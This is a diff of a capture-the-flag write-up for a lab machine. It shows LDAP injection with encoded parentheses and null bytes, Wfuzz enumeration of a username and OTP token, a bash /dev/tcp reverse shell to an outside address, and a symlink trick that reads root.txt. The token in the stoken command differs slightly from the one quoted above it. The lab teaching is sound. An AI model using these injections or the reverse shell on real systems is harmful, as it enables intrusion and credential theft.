@@ -39,9 +39,9 @@ This server is pretected against some kind of threats, for instance, bruteforcin
 [...]
 A list of banned IP is available here...
 
-If we click on _here_ we get the output of a _top_ command and a list of banned IPs. Both information are not interesting, so we get to the _Login_ part of the page.
+If we click on _here_ we get the output of a _top_ command and a list of banned IPs. This information is not interesting, so we get to the _Login_ part of the page.
 
-We are greated with an input for an **Username** and an **OTP**. If we input a non valid user we get the message _User test not found_.
+We are greeted with an input for an **Username** and an **OTP**. If we input a non valid user we get the message _User test not found_.
 When testing for special characters with _Burpsuite_ by URL encoding strings multiple times, we get only one time URL encoded strings. This means there is some kind of blacklist in the background.
 
 If we check the source-code of the login page we get a hint that says:
@@ -88,7 +88,7 @@ We will manually create an LDAP query and test it with Burpsuite as a proxy.
 First we need to need to check when the query is successful. After a little bit of trying, we find out that 3 closed parentheses after the username gives us a different result:
 
 ```markdown
-inputUsername=Testerman%2529%2529%2529%2500&inputOTP=1234
+inputUsername=Testman%2529%2529%2529%2500&inputOTP=1234
 
 URL-encoded:
 inputUsername=Testman)))&inputOTP=1234
@@ -118,8 +118,8 @@ inputUsername=*&inputOTP=1234
 
 By requesting this we get **Cannot Login** on the webpage instead of **User test not found**. This means we can find a valid username letter by letter by Fuzzing.
 
-In _Seclists_ the wordlist _char.txt_ has every character of the alphabet and that is what we need for the next Fuzz.
-The WFUZZ command looks like this:
+In _Seclists_ the wordlist _char.txt_ has every character of the alphabet and that is what we need for the next Fuzzing task.
+The Wfuzz command looks like this:
 ```markdown
 wfuzz --hw 233 -d 'inputUsername=FUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
 ```
@@ -145,7 +145,7 @@ If we do this until Wfuzz doesn't give us any output we get the username **ldapu
 
 #### Getting the attributes of the user
 
-Now we have the user we need the attributes to enumerate futher. Our LDAP query need to look like this:
+Now that we have the user, we need the attributes to enumerate further. Our LDAP query need to look like this:
 ```markdown
 (&
   (&
@@ -177,7 +177,9 @@ wfuzz --hw 233 -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a&inputOTP=1234'
 This gives us all the valid attributes:
 > commonName, cn, mail, name, pager, objectClass, uid, userPassword, sn, surname
 
-As we are looking for the software token right now, we should enumerate the value of that attribute with Wfuzz like we enumerated the username. The only attribute that makes sense for a 81 digit number is **pager**.
+### Getting the OTP
+
+As we are looking for the 81-digit token right now, we should enumerate the value of that attribute with Wfuzz like we enumerated the username. The only attribute that makes sense for a 81 digit number is **pager**.
 
 Now our LDAP query looks like this:
 ```markdown
@@ -194,3 +196,77 @@ Now our LDAP query looks like this:
 ```
 
 We will use the same technique as how we enumerated the username, but as this is 81 digits, we will automate that process by writing a script. The script is in this repository and is called _fuzztoken.py_.
+
+After executing the script we get the 81-digit token:
+> 285449490011357156531651545652335570713167411445727140604172141456711102716717000
+
+With this token we can create the OTP with the tool _stoken_ that we found out earlier.
+```markdown
+apt install stoken
+
+stoken --token=85449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000
+```
+
+This command gives us an OTP that can be used to log in on the webpage with the user ldapuser!
+
+> If this does not work, beware that your local time has to be synched with the time of the server. The time of the server can be found in the POST response header field _Date_.
+
+### Logged in as ldapuser
+
+Now we logged in with ldapuser and the OTP, we get a new field named **Cmd**. After trying _whoami_ we get following response:
+> User must be member of root or adm group and have a registered token to issue commands on this server
+
+Remember the LDAP query where it does another check after the user attributes. The second check is probably looking for the group membership. We can bypass that by putting a NULL BYTE character after logging in, so our new LDAP query would look like this:
+```markdown
+(&
+  (&
+    (password=testpass)
+    (uid=ldapuser)))%00
+  )
+  (|
+    (group=adm)
+    (group=root)
+  )
+)
+```
+
+So we need to go back and log in like this:
+```markdown
+ldapuser%2529%2529%2529%2500
+
+URL-encoded:
+ldapuser)))%00
+```
+
+With this trick the query will ignore the second check if ldapuser is a member of adm or root and the command execution works!
+
+We get a reverse shell with this command and listening on port 443:
+```markdown
+bash -c 'bash -i >& /dev/tcp/10.10.14.91/443 0>&1'
+```
+
+## Privilege Escalation
+
+The shell logs us in as the user _apache_. Looking through the files for the webpage, the file _login.php_ contains the password of ldapuser in cleartext.
+> ldapuser:e398e27d5c4ad45086fe431120932a01
+
+We can log in with SSH with these credentials and escalated to the ldapuser and can read **user.txt**.
+
+After enumerating the file system we find the folder _/backup_ and in there the files _honeypot.sh_ and _error.log_.
+This bash script handles banned users and there is a line that reads something out of root.txt. On one line it does something in the path _/var/www/html/uploads_ and the _apache_ user has the permission to create files there.
+
+With the apache user we do the following:
+```markdown
+touch @Test
+ln -s /root/root.txt /var/www/html/uploads/Test
+```
+
+With the ldapuser this:
+```markdown
+tail -f /backup/error.log
+```
+
+What this does is, the script that executes every minute reads the list file (@Test) and goes into it to read the contents of that. Every line that does not exist will be written to the error.log that we continuously view it with the ldapuser.
+> If it did not work, you missed the time frame and have to repeat that process again.
+
+So the error.log will give us the content of root.txt!
